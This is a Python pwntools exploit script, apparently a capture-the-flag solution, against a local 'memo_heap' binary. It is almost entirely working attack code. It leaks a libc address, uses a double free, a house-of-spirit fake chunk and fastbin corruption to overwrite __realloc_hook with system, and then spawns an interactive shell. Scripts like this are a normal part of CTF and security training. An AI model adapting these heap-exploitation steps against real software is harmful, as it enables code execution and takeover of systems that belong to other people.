from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./memo_heap"
bin = ELF(file)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

conn = process(file)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("Your choice: ")
    conn.sendline(str(ch))

def add(size, name = None):
    menu(1)
    conn.recvuntil("What is size of memo")
    conn.sendline(str(size))
    conn.recvuntil("Name of memo: ")
    if size != 0:
        conn.send(name)
    conn.recvuntil("Done!")

def edit(i, name = None, shell=False):
    menu(2)
    conn.recvuntil("Index of memo")
    conn.sendline(str(i))
    if shell:
        return
    if name is not None:
        conn.recvuntil("New name")
        conn.send(name)
        conn.recvuntil("Done!")
    else:
        conn.recvuntil("Can not edit this memo")

def show(i):
    menu(3)
    conn.recvuntil("Index of memo")
    conn.sendline(str(i))
    conn.recvuntil("Name: ")

def delete(i):
    menu(4)
    conn.recvuntil("Index of memo")
    conn.sendline(str(i))
    conn.recvuntil("Done!")

# Leaking libc
add(0x80, "a")
add(0x80, "b")
delete(0)
add(0x80, "a"*8)
show(0)

conn.recvn(8)

libc_leak = u64(conn.recvn(6) + "\x00\x00")
libc.address = libc_leak - 0x7f7a36f98b78 + 0x7f7a36bd4000

# Cleaning
delete(0)
delete(1)

# Double free
add(0)
add(0)
edit(0)
delete(1)
delete(0)

add(0x10, p64(0)) # 0
add(0x10, "a") # 1
add(0x10, "b") # 2
edit(0, "\xf0")

# House of spirit
payload = p64(0) + p64(0x70)
payload = payload.ljust(0x70, "\x00")
payload += p64(0) + p64(0x70)
add(0x200, payload) # 3

delete(2)

# Fastbin corruption
payload = p64(0) + p64(0x70) + p64(libc.symbols['__realloc_hook'] - 0x1b)
edit(3, payload)

add(0x60, "/bin/sh\x00") # 2
add(0x60, "\x00"*(0x1b - 0x10) + p64(libc.symbols['system']))

edit(2, shell=True)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
